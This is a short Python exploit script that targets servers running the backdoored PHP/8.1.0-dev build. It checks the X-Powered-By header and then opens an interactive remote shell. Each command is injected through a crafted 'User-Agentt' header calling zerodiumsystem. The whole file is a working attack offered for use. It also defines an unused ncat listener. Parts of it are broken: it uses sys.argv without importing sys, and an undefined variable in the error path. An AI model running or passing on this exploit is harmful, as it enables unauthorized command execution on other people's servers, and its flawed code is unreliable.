#!/bin/python3

# PHP/8.1.0-dev RCE exploit

import requests

target = input ("[*] Enter target url(domain): ")

print("[*] Checking if target is vulnerable for exploit...")

check_vuln = requests.get(target, allow_redirects=False)
try:
        headers = check_vuln.headers
        if headers['X-Powered-By'] == "PHP/8.1.0-dev":
                print ("[*] Target is vulnerable for PHP/8.1.0-dev RCE!")
        else:
                print ("[-] Target is not vulnerable for PHP/8.1.0-dev RCE!")
                exit()
except KeyboardInterrupt:
        print ("[-] KeyboardInterrupt detected! Exiting...")
        exit()
except:
        print ("[-] Target is not vulnerable for PHP/8.1.0-dev RCE!")
        exit()

import threading
def start_ncat():
        import os
        os.system("ncat -nlvp 4444")

session = requests.Session()
target_res = requests.get(target)
if int(target_res.status_code) == 200:
        print ("[*] Opening interactive shell on {}".format(sys.argv[1]))
        try:
                while True:
                        prompt = input("$ ")
                        headers = {
                                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                                "User-Agentt": 'zerodiumsystem("' + prompt + '");'
                        }
                        target_res = requests.get(target, headers=headers, allow_redirects=False)
                        current_page = target_res.text
                        stdout = current_page.split('<!DOCTYPE html>', 1)
                        text = print(stdout[0])
        except KeyboardInterrupt:
                print ("[-] KeyboardInterrupt detected! Exiting...")
                exit()
else:
        print ("[-] ERROR! HTTP-Status: " + str(response.status_code))
        exit()
